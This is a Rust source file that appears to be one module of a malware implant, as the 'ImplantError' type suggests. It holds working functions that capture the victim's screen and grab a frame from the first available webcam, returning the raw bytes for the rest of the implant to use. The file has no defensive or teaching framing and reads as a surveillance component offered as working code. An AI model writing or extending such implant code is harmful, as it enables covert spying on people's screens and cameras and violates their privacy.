use eye::prelude::*;
use scrap::{Capturer, Display};
use std::io::ErrorKind::WouldBlock;
use std::thread;
use std::time::Duration;

use crate::errors::ImplantError;

pub fn take_screenshot() -> Result<Vec<u8>, ImplantError> {
    let one_second = Duration::new(1, 0);
    let one_frame = one_second / 60;

    let display = Display::primary()?;
    let mut capturer = Capturer::new(display)?;
    let (w, h) = (capturer.width(), capturer.height());

    loop {
        // Wait until there's a frame.
        let buffer = match capturer.frame() {
            Ok(buffer) => buffer,
            Err(error) => {
                if error.kind() == WouldBlock {
                    // Keep spinning.
                    thread::sleep(one_frame);
                    continue;
                } else {
                    return Err(ImplantError::ImageError);
                }
            }
        };

        // Flip the ARGB image into a BGRA image.
        let mut bitflipped = Vec::with_capacity(w * h * 4);
        let stride = buffer.len() / h;

        for y in 0..h {
            for x in 0..w {
                let i = stride * y + 4 * x;
                bitflipped.extend_from_slice(&[buffer[i + 2], buffer[i + 1], buffer[i], 255]);
            }
        }

        // repng::encode(
        //     File::create("screenshot.png").unwrap(),
        //     w as u32,
        //     h as u32,
        //     &bitflipped,
        // )
        // .unwrap();

        break Ok(bitflipped);
    }
}

pub fn take_picture() -> Result<Vec<u8>, ImplantError> {
    // Create a context
    let ctx = Context::new();

    // Query for available devices.
    let devices = ctx.query_devices()?;

    if devices.is_empty() {
        return Err(ImplantError::ImageError);
    }

    // First, we need a capture device to read images from. For this example, let's just choose
    // whatever device is first in the list.
    let dev = Device::with_uri(&devices[0])?;

    // Query for available streams and just choose the first one.
    let streams = dev.query_streams()?;
    let stream_desc = streams[0].clone();

    // Since we want to capture images, we need to access the native image stream of the device.
    // The backend will internally select a suitable implementation for the platform stream. On
    // Linux for example, most devices support memory-mapped buffers.
    let mut stream = dev.start_stream(&stream_desc)?;

    // Here we create a loop and just capture images as long as the device produces them. Normally,
    // this loop will run forever unless we unplug the camera or exit the program.s
    // let frame = stream.next()??;
    if let Some(frame) = stream.next() {
        return Ok(frame?.as_bytes().to_vec());
    } else {
        return Err(ImplantError::ImageError);
    }
}
